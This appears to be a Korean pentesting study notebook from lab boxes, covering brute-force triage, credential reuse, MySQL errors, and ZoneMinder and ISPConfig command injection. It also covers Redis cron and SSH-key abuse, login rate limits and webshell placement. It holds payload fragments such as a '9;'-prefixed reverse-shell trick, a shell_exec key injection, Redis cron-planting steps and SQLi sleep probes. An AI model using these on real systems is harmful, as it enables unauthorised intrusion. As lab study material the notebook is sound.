[[Exghost]] 실측 — `directory-list-2.3-medium.txt`(220,560줄) + `raft-medium-files.txt`×확장자(85,645+) 등 **총 306,205건 완주**, 유의미한 결과는 `uploads`(301)·`server-status`(403)뿐. 알아챈 방법은 **`grep -ic '^exiftest' <워드리스트>`** — 표준 워드리스트 어디에도 `exiftest` 가 없다는 것을 직접 확인함. 진짜 진입점 `exiftest.php` 는 원천적으로 나올 수 없었음.

**손절 신호 — 대형 워드리스트가 절반 넘게 돌았는데 커스텀스러운 결과가 0건이면 채널을 바꿀 것.** 우선순위:
1. **백업·캡처·로그** — FTP/SMB/웹의 `backup`·`.pcap`·`access.log`·`.bak`·`.old` ← [[Exghost]] 의 정답(FTP 의 `backup` 이 pcap, B-2-10)
2. **소스 유출** — `.git/`·노출된 zip·`.svn/`·`composer.json`
3. **JS 번들 하드코딩 경로** — `main.js`·`app.js` 안의 `fetch('/api/...')`·`action="..."`
4. **에러 메시지·스택트레이스** — 디버그 페이지가 내부 경로를 흘림
5. **`robots.txt`·`sitemap.xml`** — 숨기려던 경로가 오히려 나열됨
6. **앱 성격에서 유추(수동 조합)** — "exif" 힌트 → `exif.php`·`exiftest.php`·`exiftool.php`·`testexif.php`. [[Exghost]] 은 40개를 수동 추측했으나 **여기선 실패**
7. **다른 서비스에 저장된 웹 경로** — FTP·SMB·SSH·DB ← [[Exghost]] 은 열린 포트가 FTP·HTTP 둘뿐이라는 정황에서 「FTP 가 웹을 설명한다」로 넘어가 성공

⚠️ **필터 없이 30만 건을 돌리면 결과창이 오염돼 진짜 신호를 못 봄.** `-ac`(자동 캘리브레이션)·`-fc`/`-fs`(코드·크기 필터)를 안 걸면 균일한 403/404 가 화면을 채워 `uploads`(301) 한 건을 눈으로 못 찾음. **브루트포싱 실패의 절반은 「안 나온 것」이 아니라 「필터를 안 걸어 못 본 것」임**(A-1-13).
→ **브루트는 백그라운드에 계속 걸어두고 그 시간에 다른 서비스를 팔 것** — 시행착오가 아니라 시간 배분 문제임(D 절).

**브루트포스 실패는 두 축으로 갈라 진단할 것 — 처방이 반대임.**
- **확장자 부족** — 기저 단어는 워드리스트에 있는데 요청이 안 만들어짐(`config` 는 있는데 `config.conf` 를 안 던짐). **`-x` 를 넓히면 풀림**
- **워드리스트 부족** — 파일명 자체가 목록에 없음. **`-x` 를 아무리 늘려도 안 풀림.** 제품 지식·배포 아카이브·벤더 문서로 갈 것

판별은 한 줄임 — `grep -icE '^<기저단어>$' <워드리스트>`. 0 이면 둘째 축이고 `-x` 튜닝은 전부 낭비임.

[[Hub]] 실측 — 1차 `-x php,txt,html,lsp` 가 `bdd.conf`·`user.dat` 을 못 찾자 확장자 탓으로 보였으나, **`-x conf,dat,zip,log,bak,txt` 로 넓힌 2차(`ferox_80_files.log`)도 결과가 3줄뿐**이었음(`/` 403 · `/LICENSE.txt` · `/readme.txt`). 진짜 원인은 `raft-medium-files.txt` 에 `bdd`·`user.dat` 이 **0건**이라는 것이었음.

**2단 스캔을 기본 습관으로** — 1차는 언어 확장자로 빠르게, 2차는 설정·데이터 확장자로 다시:
```bash
feroxbuster -u http://TARGET/ -w raft-medium-directories.txt -x php,html,lsp -C 302
feroxbuster -u http://TARGET/ -w raft-medium-files.txt \
  -x conf,cfg,ini,env,json,yml,yaml,xml,dat,db,sql,bak,old,zip,log -C 302
```
⚠️ **`json` 을 빠뜨리는 실수가 잦음** — `composer.json`·`package.json`·`config.json`·`.well-known/*.json` 이 버전 판정 2순위 근거(패키지 메타데이터)의 주 서식지임. [[Hub]] 는 C 바이너리 제품이라 이 계층이 «없어서» 버전 판정이 유독 어려웠음.
⚠️ **파일을 손에 넣었으면 «어떻게 찾았는지»를 그 자리에서 적을 것.** 나중에 재구성하면 가장 그럴듯한 경로(= 재스캔)로 채우게 됨 — [[Hub]] 노트가 실제로 그렇게 틀렸고 지금도 취득 경로는 `[가정]` 으로 남아 있음(A-63).


**입력창이 하나뿐인 단일 파라미터 앱에 디렉터리 브루트는 그 자체가 오판이다.** [[Heist]] — 8080 "Super Secure Web Browser" 는 화면에 `Enter URL` 입력창 하나뿐이고 그것이 `?url=` 로 반영됐음. 그런데 「숨은 관리자 페이지가 있을 것」이라 가정하고 `directory-list-lowercase-2.3-medium` + `-x html,txt` 를 걸어 **148,104 / 622,887 요청(24%)** 을 돌림. 결과는 **루트 `/` 하나(200, 3608B)** 뿐(`ferox-…state`).
→ **화면의 파라미터가 URL 에 그대로 반영되면 공격면은 이미 눈앞에 다 있음.** 62만 요청짜리 워드리스트를 걸기 전에 그 파라미터를 먼저 만질 것.
→ **손절선** — 워드리스트 10%(약 6만 요청)를 돌고도 200 이 루트 하나뿐이면 거기서 끊을 것. 백그라운드로 돌려두는 것은 괜찮으나 그것을 기다리며 다른 일을 멈추면 안 됨. 실제로 [[Heist]] 는 스캔이 도는 동안 `?url=` 을 손으로 만지다 Responder 에 해시가 들어와 **브루트포싱이 끝나기 전에 박스가 풀렸음**(A-18 과 같은 배치).

#### A-24. 한 서비스의 거부는 자격증명의 오류가 아니다

**얻은 자격증명은 열린 포트 전부에 시도할 것.** ([[Clue]] — `cassie` 는 **SSH 거부 / SMB 통과 / 로컬 `su` 통과**였음. 여기서 포기했다면 박스가 막혔음)

**앱 DB 의 «사용자명»이 OS 계정명과 같으면 재사용을 의심할 것 — 근거 세 겹이면 곧바로 SSH 를 칠 것.** [[Fanatastic]] 실측: ①DB 의 `basic_auth_user = sysadmin` ②`/etc/passwd` 에 같은 이름의 **셸 있는** 계정(`sysadmin:…:/bin/sh`) ③22/tcp 열림 — 셋이 맞아 곧장 SSH 가 통했음. `/etc/passwd` 는 「누구로 로그인할 것인가」의 후보 명단이고, 셸이 `/bin/false`·`/usr/sbin/nologin` 이 아닌 계정만 대상임(UID 1000번대 = 사람이 만든 계정, 100 미만 = 시스템 계정).
→ 반대 방향(OS → 앱)도 같음. **관리자가 같은 비밀번호를 돌려쓰는 것은 규칙에 가까움.**

**반대로, 재사용이 «안 되는» 것도 흔함 — 앱 계정과 시스템 계정은 별개임.**
- [[GLPI]] — `glpi_db_password`·`betty`·`berta`·`glpi`·`password`·`Betty2023` 를 betty SSH 에 전부 시도, 전부 `Permission denied`(출처 `ssh_reuse.txt`). 가장 싼 시도라 먼저 한 것은 옳았으나 이 박스에선 불발
- [[Assignment]] — `jane` / `svc-dev2022@@@!;P;4SSw0Rd`(Gogs 계정 비번)로 SSH 시도 → `Permission denied`. 셸 안정화는 `~/.ssh/authorized_keys` 에 Kali 공개키를 심어 해결(정리 시 제거)

**회수한 자격증명 ≠ 그 자격증명을 노출한 서비스.** [[Robust]] — SQLi 로 덤프한 `employees.password`(`Jeff:Mathsisfun123`)가 정작 앱 로그인 폼에서는 `Invalid user or password.` 로 거부됨. 앱 로그인이 어느 저장소를 참조하는지는 관측 없음 — 확인된 것은 이 값이 앱 폼에서 거부됐다는 것까지임. 그러나 OS(SSH) 계정으로는 그대로 재사용돼 통과함. **자격증명은 발견한 맥락과 다른 서비스에서 통할 수 있다** — 거부됐다고 값 자체를 버리지 말고 다른 서비스에 돌려볼 것.

**MySQL 은 에러 번호로 원인이 갈림 — `1130` 과 `1045` 를 구분할 것.**
```text
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.207' is not allowed to connect to this MySQL server
```
- **1130 = 호스트 기반 거부.** 자격증명은 맞을 수 있음 → **피벗해서 로컬에서 접속하면 됨**
- **1045 = 자격증명 자체가 틀림** → 비밀번호를 더 찾아야 함

[[LazySysAdmin]] — `Admin:TogieMYSQL12345^^` 를 3306 에 직접 던져 1130 을 받았고, `wp-config.php` 의 `DB_HOST=localhost` 와 일치함. nmap 이 `MySQL (unauthorized)` 로 적은 것도 같은 현상을 본 것. **`DB_HOST` 가 `localhost` 로 박혀 있으면 외부 접속은 설계상 막혀 있다는 신호**이므로 원격 시도에 시간을 쓰지 말 것.

**클라이언트 «계열»이 다르면 SSL 요구도 다름 — 이것도 자격증명 오류처럼 보임.** [[PwnLab]] — Kali 의 MariaDB 클라이언트(11.8.3-MariaDB, client 15.2)는 기본으로 TLS 를 요구하는데 대상 MySQL 5.5.47 은 TLS 를 지원 안 함:
```text
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```
반사적으로 `--ssl-mode=DISABLED` 를 쓰면 **더 헷갈리는 에러**가 남 — 그건 Oracle MySQL 클라이언트 옵션이라 MariaDB 에서는 `mysql: unknown variable 'ssl-mode=DISABLED'` 로 죽음. **MariaDB 쪽 정답은 `--skip-ssl`.** 낡은 DB 를 만나면 클라이언트 계열부터 확인하는 것이 빠름.

**`max_connect_errors` 락아웃(1129)도 자격증명 오류처럼 보임 — 그런데 별개임.** 실패한 접속(**핸드셰이크 실패 포함**)을 반복하면:
```text
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.207' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
```
시험장에서 DB 에 크리덴셜을 순차로 시도하다 이 에러를 만나면 「비밀번호가 다 틀렸다」로 오판하기 쉬움 — **에러 코드가 1045(자격증명 오류)·1130(호스트 거부)·1129(연결오류 누적 차단)로 전부 다르므로 문구를 구분해 읽을 것.**
— 출처: `~/PG/PwnLab/try3_mysql_ssl.log`

**⚠️ `config.php` 의 `db_host_name => 'localhost'` 는 「앱이 접속하는 주소」일 뿐 «서버측 호스트 ACL» 이 아님.** 둘을 같은 것으로 읽으면 안 됨 — 앞의 1130 은 `mysql.user` 의 `user@host` 행 문제이고 설정 파일 값은 그 행이 무엇인지 말해주지 않음.
**우회는 둘** — SSH 포트포워딩(`ssh -L 3306:127.0.0.1:3306`, B-71) 또는 이미 잡은 셸·웹셸을 경유.
**그리고 그 값의 진짜 가치는 «패스워드 재사용» 쪽임** — 얻은 비밀번호로 SSH·다른 서비스를 다시 시도할 것(B-6-12). [[Crane]] 은 MySQL `root` / 빈 패스워드라 재사용 가치가 없었고, `SELECT user,host FROM mysql.user` 를 조회하지 않아 `root@localhost` 만 존재했는지는 `[가정]` 임.

**같은 서비스에서 «1회» 실패한 것도 자격증명 무효가 아님 — 대개 내 오타임.** [[MiddlewareBypass]] — 웹에서 얻은 `root:modeling-katja-lad-common` 을 SSH 에 넣을 때 첫 시도가 `Permission denied` 로 떨어지고 두 번째에 통과함(원문에 사유 기록 없음, 오타로 추정 `[가정]`).
하이픈이 섞인 4단어형 크리덴셜은 화면에서 눈으로 옮겨 적으면 `-`/`_`, `l`/`1`, `0`/`O` 혼동이 잦음.
→ **최소 2번은 정확히 다시 칠 것.** 화면 텍스트는 복사하거나 `curl` 로 받아 `grep` 으로 뽑고, 테스트 환경에서는 `sshpass -p '<pw>' ssh root@TARGET` 로 한 번에 넣어 오타를 배제할 것. **「1회 실패 = 크리덴셜 무효」로 읽으면 정답을 손에 쥐고도 다른 경로를 파게 됨.**

#### A-25. 그럴듯한 로그인 폼이 미끼일 수 있다

**로그인 폼이 있다고 그게 취약점 자리는 아니다.** [[Robust]] `login.php`: 오류기반 10종 + 시간기반 6종 SQLi 페이로드 16개를 던졌으나 응답이 **전부 바이트 단위로 동일**했고, 그 본문은 나중에 정상 자격증명으로 로그인했을 때와도 같은 1838B(`Invalid user or password.` 포함). 시간기반 6종은 응답 코드·크기만 기록했고 **응답 지연 시간은 측정해 두지 않음** — 「시간 지연이 없었다」고는 말 못 하고, 본문이 같았다는 것까지가 관측. 실제 주입점은 별개 엔드포인트(`home.php` 검색 파라미터)였음. 로그인 폼에 시간을 안 태운 게 중요 — 응답이 균일하면 다른 진입 엔드포인트부터 배치 프로빙할 것(A-15).

**반대 방향도 성립함 — 소스를 먼저 읽고 시도조차 안 하는 것이 맞을 때가 있음.** [[PwnLab]] `login.php` 는 `mysqli->prepare()` + `bind_param()` 을 정확히 씀. 소스를 이미 확보한 상태였으므로 SQLi 페이로드를 하나도 던지지 않고 배제했음 — **웹 소스를 읽는 데 쓴 1분이 SQLi 시도 20분을 아꼈음.** 소스가 없을 때만 블랙박스로 두드려볼 이유가 생김(B-1-21).

#### A-26. 저장 폼이 200을 줘도 값이 저장되지 않을 수 있다 (PHP 느슨비교 타입저글링)

[[Cobbles]] — ZoneMinder Filter `AutoExecuteCmd` 기본값이 정수 `0`. 저장 판정(`changes()`)이 `$this->{field} != $value` 로 **느슨비교**하는데, PHP 7 에서 `int == string` 비교는 비숫자 문자열을 `(int)0` 으로 캐스팅함 → `0 != 0` = false → **「변경 없음」으로 값이 조용히 버려지고** 기본값 `0` 이 그대로 저장됨.

결과: `qx("0 /event/path")` 가 돌아 로그에 `Executing '0 …'` 만 남고 명령은 실행되지 않음. **리버스셸 두 번이 에러 없이 조용히 실패한 원인이 이것**이었음(`setsid`·`bash` 로 시작하는 비숫자 페이로드).

**우회** — 명령 앞에 `9;`(또는 `1;`)를 붙여 leading-numeric 으로 만들면 `(int)9` 캐스팅되어 `0 != 9` = true → 저장 통과. `9` 는 command-not-found 로 무해하게 죽고 `;` 뒤가 실행됨.

**교훈** — 저장 폼이 200 을 준다고 값이 저장된 게 아니다. 명령 실행형 기능에서 콜백이 없으면 **방화벽을 의심하기 전에 앱 자신의 로그로 「무엇이 실제로 실행됐는지」 먼저 확인할 것.** 자동 도구로는 절대 못 잡음 — 응답 200 을 성공으로 판정하기 때문.

— 출처: `~/PG/Cobbles/rsh80.data`(`9;` 접두) · `zm-src/web/includes/Filter.php:8-12` · `zm-src/web/includes/Object.php:247`

#### A-27. 배열 키 주입이 대상 파일을 통째로 깨뜨렸다

**`records[...]` 형태의 배열 키 주입은 `]` 를 쓰는 순간 페이로드가 잘림.** PHP 가 배열 키를 첫 `]` 에서 절단하고 뒤를 통째로 버리기 때문. 공개 PoC 가 흔히 쓰는 「`x'] = 'a'; system(...); $wb['y`」 구문끊기 방식이 여기서 깨짐 — 키가 `x'` 로 잘려 파일에 `$wb['x''] = 'zz';` 가 써지고 **그 파일의 모든 `include` 가 구문 오류로 실패**함.

- **증상** — 저장 응답과 재오픈 응답이 **둘 다 본문 0바이트**([[CVE-2023-46818]] `save_key.html`·`reopen_key.html` 각 0B, 14:38:01)
- ⚠️ 상태코드는 스크립트 표준출력에만 있었고 산출물에 안 남음 → **응답 본문 0바이트가 유일한 실측 근거**임
- Kali 에서 직접 재현 가능 — `php -r '$s="records[x%27%5D+...%27y]=zz"; parse_str($s,$o); var_dump($o);'` → 키가 `["x'"]` 로 나옴. `parse_str` 은 POST 와 같은 `php_register_variable_ex` 경로라 로컬 재현이 서버 동작과 일치
- **우회** — `]` 없는 **문자열 연결**: `x'.shell_exec('<명령>').'` (B-1-12)

#### A-28. 깨뜨린 파일이 자기 자신의 CSRF 토큰을 못 준다

**CSRF 토큰을 「편집 대상 페이지에서 파싱해 실어야 하는」 앱에서 그 대상을 익스플로잇으로 깨뜨리면, 복구용 저장 요청조차 못 보내게 됨**(토큰 파싱 실패 → 조기 반환).

[[CVE-2023-46818]] — 손상된 `help_faq_sections_list.lng` 의 편집 GET 이 본문 없는 응답 → `_csrf_id`/`_csrf_key` 파싱 실패 → 스크립트가 `NOCSRF` 로 조기 반환.

**해결 — 다른 «정상» 파일의 편집 GET 에서 토큰을 받아** 그 토큰으로 손상 파일에 정상 레코드(`test=hello`)를 덮어써 편집 가능 상태로 되돌림. CSRF 토큰이 **파일별이 아니라 세션·모듈 스코프**인 것을 이용한 것.

→ 일반화: **토큰의 스코프가 「어디까지인가」를 먼저 재라.** 리소스 단위가 아니면 **멀쩡한 리소스가 토큰 공급원**이 됨.

#### A-29. 값 위치 주입이 전부 막혔다 — 폼 전체가 막힌 것은 아니다

[[CVE-2023-46818]] — 값(value) 위치에 `system`·`passthru`·`${...}`·백틱·concat **7종을 배치로** 넣었으나 콜백 0건(안 통한 응답 `try_v*.html` 7개 보존).

- 라운드트립에서 확인된 것은 **`$` 가 사라진다**는 것뿐(`$wb['q']` → `wb['q']`, `${@system(...)}` → `{@system(...)}`)
- 따옴표가 파일에서 어떻게 처리됐는지는 **미확인** — 응답의 `&quot;` 는 HTML 속성 인코딩이라 근거가 못 됨
- **값 쪽이 막혔다는 것만 확정하고 키 위치로 이동한 것**이 우회 경로가 됨

→ 일반화: **「어디가 걸러지고 어디가 안 걸러지는가」를 위치별로 때려라**(B-1-13).

#### A-2-10. 무인증 Redis 인데 대체 경로(cron.d · authorized_keys · Lua)가 전부 막힌다

**Redis 는 잡혔는데 고전 3경로가 각각 다른 이유로 죽는 경우가 있음. 원인이 다르므로 따로 판정할 것**([[Wombo]] 실측).

**ⓐ `/etc/cron.d` — RDB 헤더 오염.** `config set dir /etc/cron.d` → `dbfilename pwnjob` → cron 문법 문자열 `SET` → `SAVE` 까지 **Redis 응답은 전부 `OK`** 인데 크론이 돌지 않음.
`[가정]` `SAVE` 가 쓰는 것은 RDB 파일이라 선두에 `REDIS0009…` 바이너리 헤더 줄이, 말미에 `\xff`+CRC 푸터가 붙음. Debian cron 은 `/etc/cron.d` 파일에 파싱 불가능한 줄이 있으면 **파일 전체를 폐기**하므로 선두 바이너리 줄에서 걸려 우리 명령까지 통째로 버려짐. ⚠️ **크론 거부 로그를 회수한 산출물은 없음** — 관측된 것은 「크론이 돌지 않았다」까지이고 원인은 `[가정]`임.
부수 함정 — 셸의 `$(...)` 명령치환이 **후행 개행을 먹어** RDB 푸터가 cron 명령 줄에 그대로 붙음(`plant_cron.sh` 의 `PRE`/`POST` 에 `$'\n\n'` 패딩을 준 이유). **이건 고쳐도 선두 바이너리 줄이 여전히 파일을 죽임.**
→ **Debian 에서 Redis→cron.d 는 불안정함. 모듈 로드 경로가 있으면 그쪽이 우선**(B-25).

**ⓑ `/root/.ssh/authorized_keys` — `CONFIG SET dir` 에서 막힘.**
```text
ERR Changing directory: No such file or directory
```
— 출처: `~/PG/Wombo/ssh_dir_check.txt`(타겟에 직접 친 실측)
`CONFIG SET dir` 는 내부적으로 `chdir()` 을 호출함. 대상 디렉터리가 없으면 `chdir` 이 실패하고 `dir` 는 이전 값(`/`)으로 남음. **전제 조건은 ① `.ssh` 디렉터리가 이미 존재 ② Redis 가 거기 쓸 권한** — 디렉터리를 만들려면 이미 RCE 가 필요하니 순환임.
⚠️ **`config set dir <경로>` 를 아무 페이로드도 준비하기 전에 한 번 쳐서 경로 가용성부터 판정할 것.** [[Wombo]] 는 SSH 키쌍을 먼저 만들고(11:35) 크론을 두 번 돌린 뒤(11:36·11:39) **11:50 에야** 이 확인을 했음 — 순서가 거꾸로여서 14분을 태움.

**ⓒ Lua 샌드박스 탈출(CVE-2022-0543) — «실행 파일 경로» 하나로 갈림.** `INFO server` 의 `executable:` 을 볼 것.
- `/usr/bin/redis-server`(배포판 패키지 경로) → **후보.** 이 결함의 원인은 Redis 상류가 아니라 **Debian/Ubuntu 패키징이 추가한 Lua 라이브러리 노출**임
- `/usr/local/bin/redis-server` → **소스 컴파일본. 미적용** — 상류 Redis 의 Lua 는 `package`·`os` 가 정상 샌드박싱됨

[[Wombo]] 는 후자(`executable:/usr/local/bin/redis-server`, `gcc_version:6.3.0`)라 이 경로가 애초에 없었음. **CVE 번호를 보기 전에 `executable:` 부터 볼 것** — 열거 3초로 시도 전체가 배제됨.
⚠️ 타겟에서 `EVAL` 로 `package`·`os` 가 `nil` 임을 확인했다는 근거는 `writeup_notes.txt` 한 줄뿐이고 **EVAL 출력 원문은 미보존** — 위 서술은 소스 컴파일본의 일반 성질임.
⛔ **Kali 로컬로 타겟 동작을 흉내 내지 말 것.** Kali 의 `redis-server` 는 **8.0.4**(2026-08 실측 `redis-server --version`)라 `MODULE LOAD`·`CONFIG SET dir`·`EVAL` 의 에러 문구가 5.x 와 다름(8.x 는 `enable-module-command` 같은 신규 가드를 냄). **타겟 고유 동작은 타겟에 직접 친 출력으로만 인용할 것.**

#### A-2-11. 「메일을 보냈습니다」가 나오는데 아무것도 안 온다 — 비동기 큐에는 워커가 필요하다

**증상** — 가입 확인 메일을 SMTP 캐처로 가로채려는데, 앱은 매번 「발송됨」 화면을 주면서 패킷이 하나도 안 나감.

**비동기 큐를 쓰는 앱에서 성공 화면은 「태스크를 큐에 넣었다」는 뜻일 뿐임**(A-12 의 반대 방향). 워커가 없으면 UI 는 성공을 말하면서 **아무 일도 하지 않음.**

[[Fikklish]] 실측 — `REGISTRATION_OPEN=True` + `EMAIL_HOST=localhost:25` 를 보고 「메일 주소를 우리 Kali 로 지정하면 활성화 링크가 온다」는 그림을 그림. 파이썬 SMTP 캐처(`smtpcatch.py`)를 tmux 로 띄우고 `swaks` 자체시험까지 통과시킨 뒤 주소를 바꿔가며 가입을 반복했음:
- `@192.168.45.207` — Weblate 는 받아주나 MTA 가 숫자 도메인을 호스트명으로 DNS 조회해 실패
- `catchx@[192.168.45.207]` — Django `EmailValidator` 가 도메인 리터럴을 허용해 통과, 가입 성공(`/accounts/email-sent/`). **그래도 무응답**
- `@192.168.45.207.nip.io` · `@192-168-45-207.sslip.io` — 공개 와일드카드 DNS 로 이름 해석 우회. **역시 무응답**

`tcpdump` 상 타겟→Kali **25번 연결이 0건**이었고, 저장된 캡처(`reg_smtp.pcap`, 19:04~19:32)를 다시 세도 `tcp port 25` 는 **0패킷**임(걸린 4,139패킷은 전부 hydra SSH·ICMP 확인·443 리버스셸). root 를 잡고서야 원인이 확정됨(`harvest_root.txt`):
- **`ps` 어디에도 celery 워커가 없음.** weblate 로 도는 것은 `runserver` 부모(PID 900)와 자식(PID 16427)뿐. Weblate 4.11 의 가입 메일은 `send_mails.delay(...)` 로 celery 큐에 들어가므로 **워커가 없으면 큐에 쌓이고 끝**
- **`ss -lntup` LISTEN 목록에 25번이 없음.** 떠 있는 것은 8000·6379·80·53·22·5432뿐. `exim4 4.95-4ubuntu2.6` 패키지는 설치돼 있고 `/usr/sbin/exim4` 도 존재하나 데몬이 안 뜸
- 같은 원인이 정리 단계에서도 재현 — Weblate UI 의 프로젝트 삭제도 `project_removal.delay()` 라 **실행되지 않아** Django ORM 으로 직접 지움

**손절선 — 아웃바운드 패킷이 0이면 5분 안에 접을 것.** [[Fikklish]] 은 **27분**을 태웠음.

#### A-2-12. 웹 로그인에 레이트리밋·계정 잠금이 걸려 있다 — 브루트가 계정을 죽인다

**「Too many attempts」를 본 순간 남은 길은 둘뿐** — ① 힌트로 후보를 3~5개로 줄이거나 ② 다른 진입점을 찾거나. 시험에서 한 계정에 30분을 태우면 그 박스는 포기한 것과 같음.

⛔ **계정 잠금은 되돌릴 수 없는 사고임.** 실패 N회에 **비밀번호 자체를 무효화**하는 앱이 있음. [[Fikklish]] 의 Weblate 4.11 — `RATELIMIT_ATTEMPTS=5`(IP당 5회/5분) 위에 `AUTH_LOCK_ATTEMPTS=10` 이 따로 있고, **마지막 로그인 이후 실패 10회면 그 계정 비밀번호가 `set_unusable_password()` 로 무효화**됨:
```python
if self.activity == "failed-auth" and self.user.has_usable_password():
    failures = AuditLog.objects.get_after(self.user, "login", "failed-auth")
    if failures.count() >= settings.AUTH_LOCK_ATTEMPTS:
        self.user.set_unusable_password()
```
— 출처: `weblate/accounts/models.py`(weblate-4.11 태그)

**같은 박스에서 세 번 연속 오판했음:**
1. **`X-Forwarded-For` 로 우회 시도 → 실패.** 나중에 `IP_BEHIND_REVERSE_PROXY = False` 를 확인했고 소스도 그 경우 `REMOTE_ADDR` 을 그대로 씀. **추측으로 먼저 시도하고 소스로 나중에 확인한 순서가 거꾸로였음**(B-15 는 프록시 뒤일 때 통하는 것임)
2. **락아웃 상태에서 재시도 루프를 돌림.** `weblate/utils/ratelimit.py` 의 `cache.set(key, attempts, LOCKOUT)` 이 **시도할 때마다 락아웃 타이머를 새로 감음** — 두드리느라 스스로 10분을 계속 연장하고 있었음. **루프를 죽이고 조용히 기다리는 것이 유일한 해법**
3. **`/admin/login/` 이 별도 경로라 우회로일 거라 기대.** `weblate/wladmin/sites.py` 의 `AdminLoginForm(LoginForm)` 이 **같은 레이트리밋을 공유**함을 소스로 확인

✅ **존재하지 않는 계정으로 정책을 먼저 떠본 것은 옳은 판단이었음** — 12회 시험해 5회째부터 같은 메시지가 뜨는 것을 확인했고, 실계정으로 했으면 잠금 예산을 그만큼 태웠을 것.

**결과** — 실제 admin 실패 시도를 5회 쓴 상태에서 6번째(`Niffenegger`, 대소문자 오판)도 틀렸고 7번째(`niffenegger`)에 성공. **잠금까지 4회 남기고 끝남.** 그리고 **cewl 348단어를 웹 폼에 먹이는 것은 5회/5분 정책상 애초에 불가능한 계획**이었음(6시간+ 소요, 그 전에 계정 사망).

#### A-2-13. 노출된 소스와 «배포본»이 다르다 — 소스는 지도지 정답지가 아니다

**증상** — 소스대로 호출했는데 405 Method Not Allowed. 「막혔다」가 아니라 **리비전이 어긋난 것**임.

[[Hawat]] — Nextcloud 에서 회수한 `issuetracker.zip` 의 컨트롤러는 `@GetMapping("/issue/checkByPriority")`(소스 60행)였음. 그래서 GET 으로 판단했는데 **배포된 jar 는 POST 만 받음.**
```text
GET  /issue/checkByPriority?priority=Normal            → 405 Method Not Allowed
GET  ...priority=Normal' UNION SELECT sleep(5)--       → 405, 0.17s
POST priority=Normal' UNION SELECT sleep(5)--          → 200, 5.17s
```
⚠️ 이 응답 3행은 원 노트 기록이고 raw 응답은 산출물 미보존임. 다만 **산출물 5종(`oracle.sh`·`exploit.py`·`probe.py`·`blind.py`·`shell.py`)이 전부 POST 로 고정**돼 있어 「소스는 GET, 성립은 POST」는 교차 확인됨.

**왜 어긋나는가** — 노출된 소스는 **개발 중 스냅샷**일 수 있음. 진짜 배포본은 [[Hawat]] 의 경우 `/home/clinton/tracker-0.0.1-SNAPSHOT.jar` 였고, 셸을 잡은 뒤 디컴파일하면 실제 코드가 나옴.

→ **소스에서 얻은 「어떻게 호출하는가」는 «가설»로 취급하고 405·400 같은 응답으로 즉시 검증할 것.** 405 가 나오면 메서드부터 바꿔 볼 것 — 그것이 이 함정의 탈출구임. 반면 **「어디에 취약점이 있는가」는 소스가 정확했음**(70행 문자열 연결이 그대로 성립).

#### A-2-14. 웹셸을 심을 웹루트를 «틀린 곳»에 골랐다

**증상** — `INTO OUTFILE` 이 오류 없이 돌아왔는데 그 URL 이 404. 또는 웹셸은 도는데 uid 가 낮음.

[[Hawat]] — 웹서버가 둘(50080 Apache · 30455 nginx+php-fpm)이라 **쓰는 위치에 따라 웹셸 실행 uid 가 달라짐.**

| 포트 | 서버 | DocumentRoot | 디렉터리 권한 | 웹셸 uid |
|---|---|---|---|---|
| 50080 | Apache + PHP | `/srv/apache` | 0777 | `uid=33(http)` |
| 30455 | nginx + PHP-FPM | `/srv/http` | 0777 | **`uid=0(root)`** |
| — | (nginx 기본) | `/usr/share/nginx/html` | 0755 root | 쓰기 실패 |

**시행착오 순서가 파일 mtime 에 그대로 찍힘:**
- `exploit.py`(09:20:35) — 투하 경로가 **`/usr/share/nginx/html/rce.php` 하나로 하드코딩**. 이것이 0755 root 라 실패한 경로임
- `probe.py`(09:21:21) — 그래서 웹루트 후보를 `load_file()` 오라클로 전수 탐색(`/usr/share/webapps/nextcloud/config/config.php`·`/usr/share/nginx/html/cloud/config/config.php`·`/usr/share/httpd/index.html`·`/srv/www/index.html`·`/home/issue/local.txt`·`/etc/passwd`)
- `shell.py`(09:23:20) — 경로를 **`sys.argv` 로 받도록 고쳐** 여러 후보에 연속 투하 + 즉시 `load_file()` 로 성공 확인
→ 하드코딩 1경로 → 탐색 → 파라미터화. **약 3분이 이 구간에 들어감.**

⛔ **「존재 확인」을 없는 파일명으로 하지 말 것.** [[Hawat]] 은 웹루트 확인용으로 `/index.html` 을 요청해 404 를 받았는데, 그 디렉터리에는 `index.php` 만 있었음(`~/PG/Hawat/gob_30455.txt` 가 `index.php` 200 / `index.html` 부재를 그대로 보여줌). **`phpinfo.php` 의 `DOCUMENT_ROOT` 처럼 직접적인 근거를 쓰거나 실제로 있는 파일명으로 확인할 것.**

**투하 전 확인 한 줄** — `ps aux | grep -E 'nginx|apache|php-fpm'`. 누가 그 PHP 를 실행하는지가 권한상승 유무를 통째로 결정함(B-34).

**php-fpm(9000) FastCGI 직타는 «페이로드」가 아니라 «docroot 를 아는가»의 문제로 환원됨.** `SCRIPT_FILENAME` 이 가리키는 파일이 **실제로 존재해야** 요청이 처리되고, 없으면 `Primary script unknown` 만 뱉으며 `auto_prepend_file` 도 안 돎:
```text
--- STDOUT ---
Status: 404 Not Found
Content-type: text/html; charset=UTF-8

File not found.

--- STDERR ---
Primary script unknown
```
— 출처: `~/PG/PlanetExpress/try1_fcgi_index.log`(135바이트, **첫 한 건만 보존**되고 나머지는 tmux 스크롤백과 함께 소멸)

[[PlanetExpress]] — `/var/www/html/index.php` 를 시작으로 docroot 후보를 브루트했으나 전부 실패. `[가정]` `writeup_notes.txt` 는 「후보 12개」라고만 적었고 **개별 시도의 출력은 어느 산출물에도 없음** — 여러 개를 던진 것은 사실이나 몇 개였는지는 기록에 없음. 정답 `/var/www/html/planetexpress` 는 **추측 목록에 들어갈 이름이 아니었고**, 정보 유출(phpinfo 의 `DOCUMENT_ROOT`)로 얻어야 하는 값이었음. 소요 약 3분(16:04~16:05 → 16:06 phpinfo 확보로 해소).
→ **브루트에 시간을 쓰기 전에 경로 유출 통로부터 뒤질 것** — phpinfo · 스택트레이스 · `debug=true` · `.git` · 백업 파일. 이 박스는 `debug: true` 도 켜져 있어 Twig 예외를 유도하는 길도 있었음.


**「지정한 파일명이 안 생겼다」가 「아무 일도 안 일어났다」가 아닐 수 있음 — 다른 파일이 대신 덮였을 수 있음.**
[[plum]] 의 PluXml 템플릿 편집기는 `realpath()` 로 경로를 확정하는데 **`realpath()` 는 존재하지 않는 경로에 `false` 를 반환**함:
```bash
